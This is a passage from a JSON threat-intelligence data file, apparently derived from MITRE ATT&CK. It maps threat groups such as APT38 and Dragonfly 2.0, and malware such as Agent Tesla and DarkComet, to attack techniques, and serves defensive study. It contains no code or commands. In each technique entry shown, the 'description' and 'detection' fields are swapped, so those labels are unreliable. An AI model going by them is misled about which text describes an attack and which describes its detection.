                "description": "DarkComet is a Windows remote administration tool and backdoor.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1562.001": "Disable or Modify Tools",
                    "T1056.001": "Keylogging",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.002": "Software Packing",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1115": "Clipboard Data",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1057": "Process Discovery",
                    "T1033": "System Owner/User Discovery"
                }
            },
            "val": 18
        },
        {
            "id": "T1071.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Mail Protocols",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may communicate using application layer protocols associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \n\nProtocols such as SMTP/S, POP3/S, and IMAP that carry electronic mail may be very common in environments.  Packets produced from these protocols may have many fields and headers in which data can be concealed. Data could also be concealed within the email messages themselves. An adversary may abuse these protocols to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "macOS",
                    "Windows"
                ]
            }
        },
        {
            "id": "T1218.009",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Regsvcs/Regasm",
                "chain_phase": "defense-evasion",
                "description": "Use process monitoring to monitor the execution and arguments of Regsvcs.exe and Regasm.exe. Compare recent invocations of Regsvcs.exe and Regasm.exe with prior history of known good arguments and executed binaries to determine anomalous and potentially adversarial activity. Command arguments used before and after Regsvcs.exe or Regasm.exe invocation may also be useful in determining the origin and purpose of the binary being executed.",
                "detection": "Adversaries may abuse Regsvcs and Regasm to proxy execution of code through a trusted Windows utility. Regsvcs and Regasm are Windows command-line utilities that are used to register .NET Component Object Model (COM) assemblies. Both are digitally signed by Microsoft.  \n\nBoth utilities may be used to bypass application control through use of attributes within the binary to specify code that should be run before registration or unregistration: <code>ComRegisterFunction</code> or <code>ComUnregisterFunction</code> respectively. The code with the registration and unregistration attributes will be executed even if the process is run under insufficient privileges and fails to execute.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "T1497",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Virtualization/Sandbox Evasion",
                "chain_phase": "defense-evasion",
                "description": "Virtualization, sandbox, user activity, and related discovery techniques will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained. Detecting actions related to virtualization and sandbox identification may be difficult depending on the adversary's implementation and monitoring required. Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection.",
                "detection": "Adversaries may employ various means to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox. If the adversary detects a VME, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for VME artifacts before dropping secondary or additional payloads. Adversaries may use the information learned from Virtualization/Sandbox Evasion during automated discovery to shape follow-on behaviors. \n\nAdversaries may use several methods to accomplish Virtualization/Sandbox Evasion such as checking for security monitoring tools (e.g., Sysinternals, Wireshark, etc.) or other system artifacts associated with analysis or virtualization. Adversaries may also check for legitimate user activity to help determine if it is in an analysis environment. Additional methods include use of sleep timers or loops within malware code to avoid operating within a temporary sandbox.",
                "is_subtype": false,
                "platforms": [
                    "Windows",
                    "macOS",
                    "Linux"
                ]
            }
        },
        {
            "id": "S0331",
            "type": "tool",
            "attributes": {
                "name": "Agent Tesla",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Agent Tesla is a spyware Trojan written for the .NET framework that has been observed since at least 2014.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.003": "Mail Protocols",
                    "T1071.001": "Web Protocols",
                    "T1048.003": "Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol",
                    "T1564.003": "Hidden Window",
                    "T1204.002": "Malicious File",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1087.001": "Local Account",
                    "T1562.001": "Disable or Modify Tools",
                    "T1560": "Archive Collected Data",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1555": "Credentials from Password Stores",
                    "T1552.002": "Credentials in Registry",
                    "T1552.001": "Credentials In Files",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.009": "Regsvcs/Regasm",
                    "T1055.012": "Process Hollowing",
                    "T1053.005": "Scheduled Task",
                    "T1497": "Virtualization/Sandbox Evasion",
                    "T1203": "Exploitation for Client Execution",
                    "T1185": "Man in the Browser",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1125": "Video Capture",
                    "T1124": "System Time Discovery",
                    "T1115": "Clipboard Data",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1065": "Uncommonly Used Port",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1047": "Windows Management Instrumentation",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 37
        },
        {
            "id": "G0082",
            "type": "group",
            "attributes": {
                "val": 3,
                "name": "APT38",
                "aliases": [],
                "description": "APT38 is a financially-motivated threat group that is backed by the North Korean regime. The group mainly targets banks and financial institutions and has targeted more than 16 organizations in at least 13 countries since at least 2014.\n\nNorth Korean group definitions are known to have significant overlap, and the name Lazarus Group is known to encompass a broad range of activity. Some organizations use the name Lazarus Group to refer to any activity attributed to North Korea. Some organizations track North Korean clusters or groups such as Bluenoroff, APT37, and APT38 separately, while other organizations may track some activity associated with those group names by the name Lazarus Group.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0334": "DarkComet",
                    "S0039": "Net",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1059.003": "Windows Command Shell",
                    "T1565.003": "Runtime Data Manipulation",
                    "T1565.002": "Transmitted Data Manipulation",
                    "T1565.001": "Stored Data Manipulation",
                    "T1561.002": "Disk Structure Wipe",
                    "T1056.001": "Keylogging",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1529": "System Shutdown/Reboot",
                    "T1486": "Data Encrypted for Impact",
                    "T1485": "Data Destruction",
                    "T1189": "Drive-by Compromise",
                    "T1115": "Clipboard Data",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery"
                }
            }
        },
        {
            "id": "G0081",
            "type": "group",
            "attributes": {
                "val": 6,
                "name": "Tropic Trooper",
                "aliases": [
                    "Pirate Panda",
                    "KeyBoy"
                ],
                "description": "Tropic Trooper is an unaffiliated threat group that has led targeted campaigns against targets in Taiwan, the Philippines, and Hong Kong. Tropic Trooper focuses on targeting government, healthcare, transportation, and high-tech industries and has been active since 2011.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0596": "ShadowPad",
                    "S0452": "USBferry",
                    "S0388": "YAHOYAH",
                    "S0387": "KeyBoy",
                    "S0190": "BITSAdmin",
                    "S0012": "PoisonIvy"
                },
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1573": "Encrypted Channel",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1078.003": "Local Accounts",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1052.001": "Exfiltration over USB",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1564.001": "Hidden Files and Directories",
                    "T1518.001": "Security Software Discovery",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1027.003": "Steganography",
                    "T1070.004": "File Deletion",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1055.001": "Dynamic-link Library Injection",
                    "T1505.003": "Web Shell",
                    "T1518": "Software Discovery",
                    "T1221": "Template Injection",
                    "T1203": "Exploitation for Client Execution",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1135": "Network Share Discovery",
                    "T1119": "Automated Collection",
                    "T1106": "Native API",
                    "T1105": "Ingress Tool Transfer",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1046": "Network Service Scanning",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "S0452",
            "type": "tool",
            "attributes": {
                "name": "USBferry",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "USBferry is an information stealing malware and has been used by Tropic Trooper in targeted attacks against Taiwanese and Philippine air-gapped military environments. USBferry shares an overlapping codebase with YAHOYAH, though it has several features which makes it a distinct piece of malware.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1087.001": "Local Account",
                    "T1218.011": "Rundll32",
                    "T1120": "Peripheral Device Discovery",
                    "T1091": "Replication Through Removable Media",
                    "T1083": "File and Directory Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1005": "Data from Local System"
                }
            },
            "val": 11
        },
        {
            "id": "S0388",
            "type": "tool",
            "attributes": {
                "name": "YAHOYAH",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "YAHOYAH is a Trojan used by Tropic Trooper as a second-stage backdoor.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1518.001": "Security Software Discovery",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1082": "System Information Discovery",
                    "T1027": "Obfuscated Files or Information"
                }
            },
            "val": 6
        },
        {
            "id": "T1001.003",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Protocol Impersonation",
                "chain_phase": "command-and-control",
                "description": "Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)",
                "detection": "Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic.  \n\nAdversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity.",
                "is_subtype": true,
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ]
            }
        },
        {
            "id": "S0387",
            "type": "tool",
            "attributes": {
                "name": "KeyBoy",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "KeyBoy is malware that has been used in targeted campaigns against members of the Tibetan Parliament in 2016.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1001.003": "Protocol Impersonation",
                    "T1564.003": "Hidden Window",
                    "T1059.006": "Python",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1056.001": "Keylogging",
                    "T1070.006": "Timestomp",
                    "T1547.004": "Winlogon Helper DLL",
                    "T1543.003": "Windows Service",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1043": "Commonly Used Port",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 19
        },
        {
            "id": "G0073",
            "type": "group",
            "attributes": {
                "val": 2,
                "name": "APT19",
                "aliases": [
                    "Codoso",
                    "C0d0so0",
                    "Codoso Team",
                    "Sunshop Group"
                ],
                "description": "APT19 is a Chinese-based threat group that has targeted a variety of industries, including defense, finance, energy, pharmaceutical, telecommunications, high tech, education, manufacturing, and legal services. In 2017, a phishing campaign was used to target seven law and investment firms.  Some analysts track APT19 and Deep Panda as the same group, but it is unclear from open source information if the groups are the same.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0363": "Empire",
                    "S0154": "Cobalt Strike"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1132.001": "Standard Encoding",
                    "T1564.003": "Hidden Window",
                    "T1574.002": "DLL Side-Loading",
                    "T1204.002": "Malicious File",
                    "T1059.001": "PowerShell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1218.011": "Rundll32",
                    "T1543.003": "Windows Service",
                    "T1189": "Drive-by Compromise",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1082": "System Information Discovery",
                    "T1059": "Command and Scripting Interpreter",
                    "T1043": "Commonly Used Port",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery"
                }
            }
        },
        {
            "id": "G0074",
            "type": "group",
            "attributes": {
                "val": 8,
                "name": "Dragonfly 2.0",
                "aliases": [
                    "IRON LIBERTY",
                    "DYMALLOY",
                    "Berserk Bear"
                ],
                "description": "Dragonfly 2.0 is a suspected Russian group that has targeted government entities and multiple U.S. critical infrastructure sectors since at least December 2015.   There is debate over the extent of overlap between Dragonfly 2.0 and Dragonfly, but there is sufficient evidence to lead to these being tracked as two separate groups.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0500": "MCMD",
                    "S0488": "CrackMapExec",
                    "S0357": "Impacket",
                    "S0108": "netsh",
                    "S0094": "Trojan.Karagany",
                    "S0075": "Reg",
                    "S0039": "Net",
                    "S0029": "PsExec"
                },
                "techniques": {
                    "T1074.001": "Local Data Staging",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1059.006": "Python",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1069.002": "Domain Groups",
                    "T1087.002": "Domain Account",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1003.004": "LSA Secrets",
                    "T1560": "Archive Collected Data",
                    "T1114.002": "Remote Email Collection",
                    "T1003.003": "NTDS",
                    "T1003.002": "Security Account Manager",
                    "T1110.002": "Password Cracking",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1070.001": "Clear Windows Event Logs",
                    "T1136.001": "Local Account",
                    "T1547.009": "Shortcut Modification",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1505.003": "Web Shell",
                    "T1053.005": "Scheduled Task",
                    "T1221": "Template Injection",
                    "T1189": "Drive-by Compromise",
                    "T1187": "Forced Authentication",
                    "T1135": "Network Share Discovery",
                    "T1133": "External Remote Services",
                    "T1113": "Screen Capture",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1098": "Account Manipulation",
                    "T1083": "File and Directory Discovery",
                    "T1078": "Valid Accounts",
                    "T1071": "Application Layer Protocol",
                    "T1059": "Command and Scripting Interpreter",
                    "T1043": "Commonly Used Port",
                    "T1036": "Masquerading",
                    "T1033": "System Owner/User Discovery",
                    "T1018": "Remote System Discovery",
                    "T1016": "System Network Configuration Discovery",
                    "T1012": "Query Registry",
                    "T1005": "Data from Local System",
                    "T0885": "Commonly Used Port",
                    "T0853": "Scripting",
                    "T0811": "Data from Information Repositories",
                    "T0872": "Indicator Removal on Host",
                    "T0862": "Supply Chain Compromise",
                    "T0859": "Valid Accounts",
                    "T0865": "Spearphishing Attachment",
                    "T0882": "Theft of Operational Information",
                    "T0817": "Drive-by Compromise",
                    "T0852": "Screen Capture"
                }
            }
        },
        {
            "id": "S0500",
            "type": "tool",
            "attributes": {
                "name": "MCMD",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "MCMD is a remote access tool that provides remote command shell capability used by Dragonfly 2.0.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1564.003": "Hidden Window",
                    "T1059.003": "Windows Command Shell",
                    "T1036.005": "Match Legitimate Name or Location",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer",
                    "T1070": "Indicator Removal on Host",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System"
                }
            },
            "val": 10
        },
        {
            "id": "T1546.007",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Netsh Helper DLL",
                "chain_phase": "privilege-escalation",
                "description": "It is likely unusual for netsh.exe to have any child processes in most environments. Monitor process executions and investigate any child processes spawned by netsh.exe for malicious behavior. Monitor the <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code> registry key for any new or suspicious entries that do not correlate with known system files or benign software. (Citation: Demaske Netsh Persistence)",
                "detection": "Adversaries may establish persistence by executing malicious content triggered by Netsh Helper DLLs. Netsh.exe (also referred to as Netshell) is a command-line scripting utility used to interact with the network configuration of a system. It contains functionality to add helper DLLs for extending functionality of the utility.  The paths to registered netsh.exe helper DLLs are entered into the Windows Registry at <code>HKLM\\SOFTWARE\\Microsoft\\Netsh</code>.\n\nAdversaries can use netsh.exe helper DLLs to trigger execution of arbitrary code in a persistent manner. This execution would take place anytime netsh.exe is executed, which could happen automatically, with another persistence technique, or if other software (ex: VPN) is present on the system that executes netsh.exe as part of its normal functionality.",
                "is_subtype": true,
                "platforms": [
                    "Windows"
                ]
            }
        },
        {
            "id": "S0108",
            "type": "tool",
            "attributes": {
                "name": "netsh",
                "aliases": [
                    "netsh.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "netsh is a scripting utility used to interact with networking components on local or remote systems.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1518.001": "Security Software Discovery",
                    "T1562.004": "Disable or Modify System Firewall",
                    "T1546.007": "Netsh Helper DLL",
                    "T1090": "Proxy"
                }
            },
            "val": 4
        },
        {
            "id": "S0094",
            "type": "tool",
            "attributes": {
                "name": "Trojan.Karagany",
                "aliases": [
                    "xFrost",
                    "Karagany"
                ],
                "labels": [
                    "malware"
                ],
                "description": "Trojan.Karagany is a modular remote access tool used for recon and linked to Dragonfly and Dragonfly 2.0. The source code for Trojan.Karagany originated from Dream Loader malware which was leaked in 2010 and sold on underground forums.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.001": "Web Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1059.003": "Windows Command Shell",
                    "T1497.001": "System Checks",
                    "T1555.003": "Credentials from Web Browsers",
                    "T1056.001": "Keylogging",
                    "T1027.002": "Software Packing",
                    "T1070.004": "File Deletion",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1055.003": "Thread Execution Hijacking",
                    "T1113": "Screen Capture",
                    "T1105": "Ingress Tool Transfer",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1049": "System Network Connections Discovery",
                    "T1033": "System Owner/User Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1016": "System Network Configuration Discovery",
                    "T1010": "Application Window Discovery",
                    "T1003": "OS Credential Dumping"
                }
            },
            "val": 22
        },
        {
            "id": "G0080",
            "type": "group",
            "attributes": {
                "val": 5,
                "name": "Cobalt Group",
                "aliases": [
                    "Cobalt Gang",
                    "Cobalt Spider"
                ],
                "description": "Cobalt Group is a financially motivated threat group that has primarily targeted financial institutions. The group has conducted intrusions to steal money via targeting ATM systems, card processing, payment systems and SWIFT systems. Cobalt Group has mainly targeted banks in Eastern Europe, Central Asia, and Southeast Asia. One of the alleged leaders was arrested in Spain in early 2018, but the group still appears to be active. The group has been known to target organizations in order to use their access to then compromise additional victims.        Reporting indicates there may be links between Cobalt Group and both the malware Carbanak and the group Carbanak.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0284": "More_eggs",
                    "S0195": "SDelete",
                    "S0154": "Cobalt Strike",
                    "S0029": "PsExec",
                    "S0002": "Mimikatz"
                },
                "techniques": {
                    "T1059.007": "JavaScript",
                    "T1573.002": "Asymmetric Cryptography",
                    "T1071.004": "DNS",
                    "T1071.001": "Web Protocols",
                    "T1572": "Protocol Tunneling",
                    "T1204.002": "Malicious File",
                    "T1204.001": "Malicious Link",
                    "T1195.002": "Compromise Software Supply Chain",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1059.001": "PowerShell",
                    "T1566.002": "Spearphishing Link",
                    "T1566.001": "Spearphishing Attachment",
                    "T1518.001": "Security Software Discovery",
                    "T1559.002": "Dynamic Data Exchange",
                    "T1021.001": "Remote Desktop Protocol",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1218.008": "Odbcconf",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.010": "Regsvr32",
                    "T1218.003": "CMSTP",
                    "T1543.003": "Windows Service",
                    "T1037.001": "Logon Script (Windows)",
                    "T1053.005": "Scheduled Task",
                    "T1220": "XSL Script Processing",
                    "T1219": "Remote Access Software",
                    "T1203": "Exploitation for Client Execution",
                    "T1105": "Ingress Tool Transfer",
                    "T1068": "Exploitation for Privilege Escalation",
                    "T1055": "Process Injection",
                    "T1046": "Network Service Scanning",
                    "T1027": "Obfuscated Files or Information"
                }
            }
        },
        {
            "id": "G0072",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Honeybee",
                "aliases": [],
                "description": "Honeybee is a campaign led by an unknown actor that targets humanitarian aid organizations and has been active in Vietnam, Singapore, Argentina, Japan, Indonesia, and Canada. It has been an active operation since August of 2017 and as recently as February 2018.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0106": "cmd",
                    "S0096": "Systeminfo",
                    "S0075": "Reg",
                    "S0057": "Tasklist"
                },
                "techniques": {
                    "T1071.002": "File Transfer Protocols",
                    "T1074.001": "Local Data Staging",
                    "T1569.002": "Service Execution",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1560": "Archive Collected Data",
                    "T1553.002": "Code Signing",
                    "T1070.004": "File Deletion",
                    "T1548.002": "Bypass User Account Control",
                    "T1546.009": "AppCert DLLs",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.003": "Windows Service",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1112": "Modify Registry",
                    "T1083": "File and Directory Discovery",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1055": "Process Injection",
                    "T1027": "Obfuscated Files or Information",
                    "T1020": "Automated Exfiltration",
                    "T1005": "Data from Local System"
                }
            }
        },
        {
            "id": "S0096",
            "type": "tool",
            "attributes": {
                "name": "Systeminfo",
                "aliases": [
                    "systeminfo.exe"
                ],
                "labels": [
                    "tool"
                ],
                "description": "Systeminfo is a Windows utility that can be used to gather detailed information about a computer.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1082": "System Information Discovery"
                }
            },
            "val": 1
        },
        {
            "id": "S0057",
            "type": "tool",
            "attributes": {
                "name": "Tasklist",
                "aliases": [],
                "labels": [
                    "tool"
                ],
                "description": "The Tasklist utility displays a list of applications and services with their Process IDs (PID) for all tasks running on either a local or a remote computer. It is packaged with Windows operating systems and can be executed from the command-line interface.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1518.001": "Security Software Discovery",
                    "T1057": "Process Discovery",
                    "T1007": "System Service Discovery"
                }
            },
            "val": 3
        },
        {
            "id": "G0075",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Rancor",
                "aliases": [],
                "description": "Rancor is a threat group that has led targeted campaigns against the South East Asia region. Rancor uses politically-motivated lures to entice victims to open malicious documents.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0254": "PLAINTEE",
                    "S0255": "DDKONG",
                    "S0160": "certutil",
                    "S0075": "Reg"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1059.005": "Visual Basic",
                    "T1059.003": "Windows Command Shell",
                    "T1566.001": "Spearphishing Attachment",
                    "T1218.007": "Msiexec",
                    "T1053.005": "Scheduled Task",
                    "T1105": "Ingress Tool Transfer"
                }
            }
        },
        {
            "id": "S0254",
            "type": "tool",
            "attributes": {
                "name": "PLAINTEE",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "PLAINTEE is a malware sample that has been used by Rancor in targeted attacks in Singapore and Cambodia.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1573.001": "Symmetric Cryptography",
                    "T1059.003": "Windows Command Shell",
                    "T1548.002": "Bypass User Account Control",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1112": "Modify Registry",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1082": "System Information Discovery",
                    "T1057": "Process Discovery",
                    "T1016": "System Network Configuration Discovery"
                }
            },
            "val": 10
        },
        {
            "id": "S0255",
            "type": "tool",
            "attributes": {
                "name": "DDKONG",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "DDKONG is a malware sample that was part of a campaign by Rancor. DDKONG was first seen used in February 2017.",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1218.011": "Rundll32",
                    "T1140": "Deobfuscate/Decode Files or Information",
                    "T1105": "Ingress Tool Transfer",
                    "T1094": "Custom Command and Control Protocol",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 5
        },
        {
            "id": "G0070",
            "type": "group",
            "attributes": {
                "val": 4,
                "name": "Dark Caracal",
                "aliases": [],
                "description": "Dark Caracal is threat group that has been attributed to the Lebanese General Directorate of General Security (GDGS) and has operated since at least 2012.",
                "affiliation": "",
                "targets": [],
                "speciality": [],
                "tools": {
                    "S0234": "Bandook",
                    "S0235": "CrossRAT",
                    "S0182": "FinFisher",
                    "S0399": "Pallas"
                },
                "techniques": {
                    "T1071.001": "Web Protocols",
                    "T1204.002": "Malicious File",
                    "T1059.003": "Windows Command Shell",
                    "T1566.003": "Spearphishing via Service",
                    "T1027.002": "Software Packing",
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1218.001": "Compiled HTML File",
                    "T1189": "Drive-by Compromise",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery",
                    "T1027": "Obfuscated Files or Information",
                    "T1005": "Data from Local System",
                    "T1476": "Deliver Malicious App via Other Means",
                    "T1437": "Standard Application Layer Protocol"
                }
            }
        },
        {
            "id": "S0234",
            "type": "tool",
            "attributes": {
                "name": "Bandook",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "Bandook is a commercially available RAT, written in Delphi, which has been available since roughly 2007   .",
                "platforms": [
                    "Windows"
                ],
                "techniques": {
                    "T1059.003": "Windows Command Shell",
                    "T1056.001": "Keylogging",
                    "T1055.012": "Process Hollowing",
                    "T1125": "Video Capture",
                    "T1123": "Audio Capture",
                    "T1113": "Screen Capture"
                }
            },
            "val": 6
        },
        {
            "id": "S0235",
            "type": "tool",
            "attributes": {
                "name": "CrossRAT",
                "aliases": [],
                "labels": [
                    "malware"
                ],
                "description": "CrossRAT is a cross platform RAT.",
                "platforms": [
                    "Linux",
                    "Windows",
                    "macOS"
                ],
                "techniques": {
                    "T1547.001": "Registry Run Keys / Startup Folder",
                    "T1543.001": "Launch Agent",
                    "T1113": "Screen Capture",
                    "T1083": "File and Directory Discovery"
                }
            },
            "val": 4
        },
        {
            "id": "T1027.001",
            "type": "technique",
            "val": null,
            "attributes": {
                "name": "Binary Padding",
                "chain_phase": "defense-evasion",
                "description": "Depending on the method used to pad files, a file-based signature may be capable of detecting padding using a scanning or on-access based tool.  When executed, the resulting process from padded files may also exhibit other behavior characteristics of being used to conduct an intrusion such as system and network information Discovery or Lateral Movement, which could be used as event indicators that point to the source file. ",
